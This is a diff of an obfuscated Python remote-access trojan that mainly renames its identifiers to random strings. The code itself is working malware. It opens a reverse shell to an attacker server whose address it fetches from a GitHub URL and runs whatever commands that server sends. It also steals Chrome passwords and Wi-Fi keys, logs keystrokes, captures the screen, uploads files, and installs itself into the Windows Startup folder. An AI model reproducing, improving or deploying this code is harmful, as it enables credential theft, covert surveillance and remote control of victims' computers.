@@ -3,151 +3,151 @@ from PIL import ImageGrab
 from pynput.keyboard import Key, Listener
 from datetime import datetime
 from Cryptodome.Cipher import AES
-rvhMSdWqeHMgWZlfrrrH = ""
-gCfXiGFfJTYeudrQwxnD = ""
-FzirTOIISUMQDLFrczVi = "17.12.24.3"
-ANCKJfyJKvacSHJ = "!"
-gPkwDOvmalgbazgxEf = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
-GFmTEHHigvDPKnQZFVkbOYC = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
-lRxYdDgJUuPUSeAfOvGBk = os.path.expanduser("~\\AppData\\Local\\")
-def atrPQQth(host, port):
+gSfKZrYOESuqpVSvf = ""
+sJiHIiD = ""
+NgNgIbmAPa = "17.12.24.4"
+qkvIQgbjZxlMz = "!"
+RewFTcAzL = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
+lhZqZOACaUecPnQzRbS = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
+RvoZYwLJQbkHtdkWUL = os.path.expanduser("~\\AppData\\Local\\")
+def CsKvzDnFauqLGGyQ(host, port):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect((host, int(port) if port.isdecimal() else 5002))
 	return s
-def XHTuYrWvRYpfUMZLTtULPV(s):
+def DWMrQAwiXiqEX(s):
 	data = s.recv(1024)
 	if len(data)==0:
 		return True
-	dQdoGLSYPKsgmSLmsJEv = data.decode("utf-8").replace("\n","")
-	if not dQdoGLSYPKsgmSLmsJEv.startswith(ANCKJfyJKvacSHJ):
-		proc = subprocess.run(dQdoGLSYPKsgmSLmsJEv, shell=True, capture_output=True)
-		yFtJYmDMSybS = proc.stdout + proc.stderr
-		s.send(yFtJYmDMSybS)
+	oRWEThpYDSbIWEavBDEI = data.decode("utf-8").replace("\n","")
+	if not oRWEThpYDSbIWEavBDEI.startswith(qkvIQgbjZxlMz):
+		proc = subprocess.run(oRWEThpYDSbIWEavBDEI, shell=True, capture_output=True)
+		EoCkLJakc = proc.stdout + proc.stderr
+		s.send(EoCkLJakc)
 		return
-	mcKliNAZdggNPgCQDMWYoIl = dQdoGLSYPKsgmSLmsJEv.split(" ")[0][1:]
-	args = " ".join(dQdoGLSYPKsgmSLmsJEv.split()[1:]).split()
-	if mcKliNAZdggNPgCQDMWYoIl == "download":
-		KEvKzhQyCpeiEY(s, dQdoGLSYPKsgmSLmsJEv)
-	elif mcKliNAZdggNPgCQDMWYoIl == "screenshot":
-		oECvOWjpRxbIMOpZQFfH(s)
-	elif mcKliNAZdggNPgCQDMWYoIl == "basename":
+	iNDjXDRtlQWNFLaRgoOBo = oRWEThpYDSbIWEavBDEI.split(" ")[0][1:]
+	args = " ".join(oRWEThpYDSbIWEavBDEI.split()[1:]).split()
+	if iNDjXDRtlQWNFLaRgoOBo == "download":
+		CltPQDdcz(s, oRWEThpYDSbIWEavBDEI)
+	elif iNDjXDRtlQWNFLaRgoOBo == "screenshot":
+		JptPyMlIH(s)
+	elif iNDjXDRtlQWNFLaRgoOBo == "basename":
 		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
-	elif mcKliNAZdggNPgCQDMWYoIl == "update":
-		McQYRaMQe(s)
-	elif mcKliNAZdggNPgCQDMWYoIl == "wifi":
-		ujPzTlukEW(s)
-	elif mcKliNAZdggNPgCQDMWYoIl == "screenrecord":
-		DVNFfkJRIXiqNLWroNI(s, args)
-	elif mcKliNAZdggNPgCQDMWYoIl == "chrome":
+	elif iNDjXDRtlQWNFLaRgoOBo == "update":
+		WgkuVTXUvkua(s)
+	elif iNDjXDRtlQWNFLaRgoOBo == "wifi":
+		irLYqkBDhzGBgsInslYUxw(s)
+	elif iNDjXDRtlQWNFLaRgoOBo == "screenrecord":
+		VjmLaimeHtFQmtGiygx(s, args)
+	elif iNDjXDRtlQWNFLaRgoOBo == "chrome":
 		decryptPasswords(s)
-def KEvKzhQyCpeiEY(s, dQdoGLSYPKsgmSLmsJEv):
-	cbqJYGtYXqEDlL = dQdoGLSYPKsgmSLmsJEv.replace(ANCKJfyJKvacSHJ+"download ","").split(",")
-	yFtJYmDMSybSs = ""
-	for f in cbqJYGtYXqEDlL:
-		yFtJYmDMSybSs += KXoAGlYwrM(f, "api/file/", { "type":os.path.splitext(f)[1] })
-	s.send(bytes(yFtJYmDMSybSs, "utf-8"))
-def oECvOWjpRxbIMOpZQFfH(s):
+def CltPQDdcz(s, oRWEThpYDSbIWEavBDEI):
+	wZxIlkhyoNOfh = oRWEThpYDSbIWEavBDEI.replace(qkvIQgbjZxlMz+"download ","").split(",")
+	EoCkLJakcs = ""
+	for f in wZxIlkhyoNOfh:
+		EoCkLJakcs += pSZvKFWoiUMarf(f, "api/file/", { "type":os.path.splitext(f)[1] })
+	s.send(bytes(EoCkLJakcs, "utf-8"))
+def JptPyMlIH(s):
 	image = ImageGrab.grab(bbox=None,
 		include_layered_windows=False,all_screens=True,xdisplay=None)
-	zQbsZLhMxKtrZ = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
-	image.save(zQbsZLhMxKtrZ)
+	UhhjDApfWCmohjcntw = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
+	image.save(UhhjDApfWCmohjcntw)
 	image.close()
-	r = KXoAGlYwrM(zQbsZLhMxKtrZ, "api/sscap")
-	os.remove(zQbsZLhMxKtrZ)
+	r = pSZvKFWoiUMarf(UhhjDApfWCmohjcntw, "api/sscap")
+	os.remove(UhhjDApfWCmohjcntw)
 	s.send(bytes(r,"utf-8"))
-def DVNFfkJRIXiqNLWroNI(s, args):
-	QtpNdhcQjqmeEeLVH = 15
+def VjmLaimeHtFQmtGiygx(s, args):
+	cSPIIrXrKjmIuCEtTSfM = 15
 	if not args == []:
-		try: QtpNdhcQjqmeEeLVH = int(args[0])
+		try: cSPIIrXrKjmIuCEtTSfM = int(args[0])
 		except: pass
-	ptYIZYDRLKIAce = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
-	cmMyCJhxCzoUaWyrzcyGqxC = []
+	rdDFdotjFXWCsrevOMxoCK = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
+	xcgYGzOfhNz = []
 	fps = 11
-	numFrames = QtpNdhcQjqmeEeLVH * fps
+	numFrames = cSPIIrXrKjmIuCEtTSfM * fps
 	for _ in range(numFrames):
-		cmMyCJhxCzoUaWyrzcyGqxC.append(ImageGrab.grab(bbox=None, all_screens=True))
-	imageio.mimsave(ptYIZYDRLKIAce, cmMyCJhxCzoUaWyrzcyGqxC, fps=fps, quality=8)
-	KXoAGlYwrM(ptYIZYDRLKIAce, "api/screc")
-def KXoAGlYwrM(KylJeozXTgVKoVIUFzt, PSbYGCXywBuQqrpazrrFmuC, xusISQpwCcjmejvZ=None):
-	if not os.path.isfile(KylJeozXTgVKoVIUFzt):
-		return "[!] 404: "+KylJeozXTgVKoVIUFzt+"\n"
+		xcgYGzOfhNz.append(ImageGrab.grab(bbox=None, all_screens=True))
+	imageio.mimsave(rdDFdotjFXWCsrevOMxoCK, xcgYGzOfhNz, fps=fps, quality=8)
+	pSZvKFWoiUMarf(rdDFdotjFXWCsrevOMxoCK, "api/screc")
+def pSZvKFWoiUMarf(QYqpHstMsmhNH, TSHHkkXbzFGNsPxeRgil, RmqQGhGtISyqHtRIdZEFxgW=None):
+	if not os.path.isfile(QYqpHstMsmhNH):
+		return "[!] 404: "+QYqpHstMsmhNH+"\n"
 	headers = {"user":os.getlogin()}
-	if xusISQpwCcjmejvZ is not None:
-		headers = {**headers, **xusISQpwCcjmejvZ}
-	f = open(KylJeozXTgVKoVIUFzt, "rb")
-	requests.post("http://"+rvhMSdWqeHMgWZlfrrrH+":5555/"+PSbYGCXywBuQqrpazrrFmuC,
+	if RmqQGhGtISyqHtRIdZEFxgW is not None:
+		headers = {**headers, **RmqQGhGtISyqHtRIdZEFxgW}
+	f = open(QYqpHstMsmhNH, "rb")
+	requests.post("http://"+gSfKZrYOESuqpVSvf+":5555/"+TSHHkkXbzFGNsPxeRgil,
 		files={"file":f},
 		headers=headers)
 	f.close()
 	return "[+] 200\n"
-def uploadData(dataToSend, PSbYGCXywBuQqrpazrrFmuC):
+def uploadData(dataToSend, TSHHkkXbzFGNsPxeRgil):
 	if dataToSend.strip() == "":
 		return "[!] 204\n"
-	requests.post("http://"+rvhMSdWqeHMgWZlfrrrH+":5555/"+PSbYGCXywBuQqrpazrrFmuC,
+	requests.post("http://"+gSfKZrYOESuqpVSvf+":5555/"+TSHHkkXbzFGNsPxeRgil,
 		data=dataToSend,
-		headers={"user":os.getlogin()});
+		headers={"user":os.getlogin()})
 	return "[+] 200\n"
-def McQYRaMQe(s):
-	h, p, v = zREMSXCxBZzcwLYeayJQKBP(True)
-	if (v != FzirTOIISUMQDLFrczVi):
-		eUEvTGPThjyynCNITGUFdo(v)
+def WgkuVTXUvkua(s):
+	h, p, v = ZvBAYjGrgaiYv(True)
+	if (v != NgNgIbmAPa):
+		SBecPYQuHiok(v)
 		s.send(b"[+] 200\n")
 	else:
 		s.send(b"[-] 304\n")
-def ujPzTlukEW(s):
+def irLYqkBDhzGBgsInslYUxw(s):
 	try:
 		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
 	except:
 		s.send(b"[!] 500\n")
 		return
-	hzdGYaYteRrJ = ""
+	kBZZhdXxLvWmf = ""
 	for p in profiles:
-		try: hzdGYaYteRrJ+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
-		except: hzdGYaYteRrJ+=f"    {p} - N/A\n"
-	s.send(bytes(hzdGYaYteRrJ, "utf-8"))
-def eUEvTGPThjyynCNITGUFdo(OiFaJNtJvJOdSj):
-	TTRArxmzicsbZHNHTwdbx = os.path.basename(__file__)
-	fileType = TTRArxmzicsbZHNHTwdbx.split(".")[-1]
-	kTmXBtBilhWZCCGJjKihkp = TTRArxmzicsbZHNHTwdbx.split(".")[0]+"."+OiFaJNtJvJOdSj+".pyw" if fileType.startswith("py") else ".exe"
-	rJQsSiKiIknRZMFpFaqCy = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), kTmXBtBilhWZCCGJjKihkp)
-	if not os.path.isfile(rJQsSiKiIknRZMFpFaqCy):
-		with open(rJQsSiKiIknRZMFpFaqCy, "w+") as f:
-			f.write(requests.get(GFmTEHHigvDPKnQZFVkbOYC+"file."+ "pyw" if rJQsSiKiIknRZMFpFaqCy.split(".")[-1].startswith("py") else "exe").text)
-def zREMSXCxBZzcwLYeayJQKBP(force=False):
-	global rvhMSdWqeHMgWZlfrrrH, gCfXiGFfJTYeudrQwxnD
-	if force or rvhMSdWqeHMgWZlfrrrH == "" or gCfXiGFfJTYeudrQwxnD == "":
-		data = requests.get(gPkwDOvmalgbazgxEf).text.replace("\n","").split(":")
-		rvhMSdWqeHMgWZlfrrrH = data[0].strip()
-		gCfXiGFfJTYeudrQwxnD = data[1].strip()
-		OiFaJNtJvJOdSj = data[2].strip()
-	return rvhMSdWqeHMgWZlfrrrH, gCfXiGFfJTYeudrQwxnD, OiFaJNtJvJOdSj
-def nBoUIQhoqioIeXyjGxudqhD():
+		try: kBZZhdXxLvWmf+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
+		except: kBZZhdXxLvWmf+=f"    {p} - N/A\n"
+	s.send(bytes(kBZZhdXxLvWmf, "utf-8"))
+def SBecPYQuHiok(XNXwLHtzE):
+	vNsisFBtDWzuuMzPLF = os.path.basename(__file__)
+	fileType = vNsisFBtDWzuuMzPLF.split(".")[-1]
+	bzJlDNToQYHGqPn = vNsisFBtDWzuuMzPLF.split(".")[0]+"."+XNXwLHtzE+".pyw" if fileType.startswith("py") else ".exe"
+	ZPouxEWJt = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), bzJlDNToQYHGqPn)
+	if not os.path.isfile(ZPouxEWJt):
+		with open(ZPouxEWJt, "w+") as f:
+			f.write(requests.get(lhZqZOACaUecPnQzRbS+"file."+ "pyw" if ZPouxEWJt.split(".")[-1].startswith("py") else "exe").text)
+def ZvBAYjGrgaiYv(force=False):
+	global gSfKZrYOESuqpVSvf, sJiHIiD
+	if force or gSfKZrYOESuqpVSvf == "" or sJiHIiD == "":
+		data = requests.get(RewFTcAzL).text.replace("\n","").split(":")
+		gSfKZrYOESuqpVSvf = data[0].strip()
+		sJiHIiD = data[1].strip()
+		XNXwLHtzE = data[2].strip()
+	return gSfKZrYOESuqpVSvf, sJiHIiD, XNXwLHtzE
+def kiUvOjVX():
 	try:
-		BhOvRhzDjQwYLR = "settings.xpb"
-		ihvvOPyd = sorted([file for file in os.listdir(lRxYdDgJUuPUSeAfOvGBk) if os.path.isfile(lRxYdDgJUuPUSeAfOvGBk+"\\"+file) and file.endswith(BhOvRhzDjQwYLR.split(".")[-1])])
-		if BhOvRhzDjQwYLR in ihvvOPyd:
-			ihvvOPyd.remove(BhOvRhzDjQwYLR)
-		dbdWTjHPifqlTmzbbriog = os.path.join(lRxYdDgJUuPUSeAfOvGBk,BhOvRhzDjQwYLR)
-		if len(ihvvOPyd) > 0:
-			with open(dbdWTjHPifqlTmzbbriog, "ab+") as f:
-				for file in ihvvOPyd:
-					temp = os.path.join(lRxYdDgJUuPUSeAfOvGBk,file)
+		jZwcbLihPHt = "settings.xpb"
+		kDkbyqUfNH = sorted([file for file in os.listdir(RvoZYwLJQbkHtdkWUL) if os.path.isfile(RvoZYwLJQbkHtdkWUL+"\\"+file) and file.endswith(jZwcbLihPHt.split(".")[-1])])
+		if jZwcbLihPHt in kDkbyqUfNH:
+			kDkbyqUfNH.remove(jZwcbLihPHt)
+		MdtzkCJN = os.path.join(RvoZYwLJQbkHtdkWUL,jZwcbLihPHt)
+		if len(kDkbyqUfNH) > 0:
+			with open(MdtzkCJN, "ab+") as f:
+				for file in kDkbyqUfNH:
+					temp = os.path.join(RvoZYwLJQbkHtdkWUL,file)
 					with open(temp,"rb") as tf:
 						f.write(tf.read())
 					os.remove(temp)
-		KXoAGlYwrM(dbdWTjHPifqlTmzbbriog, "api/log")
-		if os.path.isfile(dbdWTjHPifqlTmzbbriog):
-			os.remove(dbdWTjHPifqlTmzbbriog)
+		pSZvKFWoiUMarf(MdtzkCJN, "api/log")
+		if os.path.isfile(MdtzkCJN):
+			os.remove(MdtzkCJN)
 	except:
 		pass
-def sutNCdgoPVweQK():
-	logging.basicConfig(filename=(lRxYdDgJUuPUSeAfOvGBk+str(datetime.today().strftime("%d")) + ".xpb"),
+def twPKfghPg():
+	logging.basicConfig(filename=(RvoZYwLJQbkHtdkWUL+str(datetime.today().strftime("%d")) + ".xpb"),
 		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
-	def DIjIEcblSqukeuNEHLqnE(k):
+	def KxQGSFkpUp(k):
 		logging.info(str(k))
-	k=Listener(on_press=DIjIEcblSqukeuNEHLqnE)
-	UmNiJgHHOxGoceABHScEg = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
-	for l in UmNiJgHHOxGoceABHScEg:
+	k=Listener(on_press=KxQGSFkpUp)
+	LXnTiUyLZFKFDNWNoAM = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
+	for l in LXnTiUyLZFKFDNWNoAM:
 		l.setLevel(logging.CRITICAL)
 	k.start()
 def decryptPasswords(s, upload=False):
@@ -162,7 +162,7 @@ def decryptPasswords(s, upload=False):
 	cursor = conn.cursor()
 	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
 	logins = []
-	for index, login in enumerate(cursor.fetchall()):
+	for _, login in enumerate(cursor.fetchall()):
 		ciphertext = login[2]
 		initVector = ciphertext[3:15]
 		encryptedPwd = ciphertext[15:-16]
@@ -178,29 +178,28 @@ def decryptPasswords(s, upload=False):
 	if not upload:
 		s.send(bytes(data,"utf-8"))
 	else:
-		r=uploadData(data, "api/google")
-		s.send(bytes(r,"utf-8"))
-def ColXGxHLIC():
-	h, p, v = zREMSXCxBZzcwLYeayJQKBP()
-	nBoUIQhoqioIeXyjGxudqhD()
+		uploadData(data, "api/google")
+def Wvtvruluwi():
+	h, p, v = ZvBAYjGrgaiYv()
+	kiUvOjVX()
 	decryptPasswords(None,True)
-	if FzirTOIISUMQDLFrczVi != v:
-		eUEvTGPThjyynCNITGUFdo(v)
-	sutNCdgoPVweQK()
-	IFsIFgIdBGMglg = bytes(("(old)"if FzirTOIISUMQDLFrczVi!=v else "")+"["+FzirTOIISUMQDLFrczVi+"] - "+os.getlogin()+" >> ", "utf-8")
+	if NgNgIbmAPa != v:
+		SBecPYQuHiok(v)
+	twPKfghPg()
+	TBVIDFnozScWfEaRCPp = bytes(("(old)"if NgNgIbmAPa!=v else "")+"["+NgNgIbmAPa+"] - "+os.getlogin()+" >> ", "utf-8")
 	while True:
 		try:
 			while True:
-				rlFqTVUMOZE=False
+				tjNnqGdyIKlwhGNlEc=False
 				try:
-					s=atrPQQth(h, p)
-					while not rlFqTVUMOZE:
-						s.send(IFsIFgIdBGMglg)
-						rlFqTVUMOZE=XHTuYrWvRYpfUMZLTtULPV(s)
+					s=CsKvzDnFauqLGGyQ(h, p)
+					while not tjNnqGdyIKlwhGNlEc:
+						s.send(TBVIDFnozScWfEaRCPp)
+						tjNnqGdyIKlwhGNlEc=DWMrQAwiXiqEX(s)
 					s.close()
 				except:
 					pass
 				time.sleep(5)
 		except:
 			time.sleep(5)
-ColXGxHLIC()
+Wvtvruluwi()
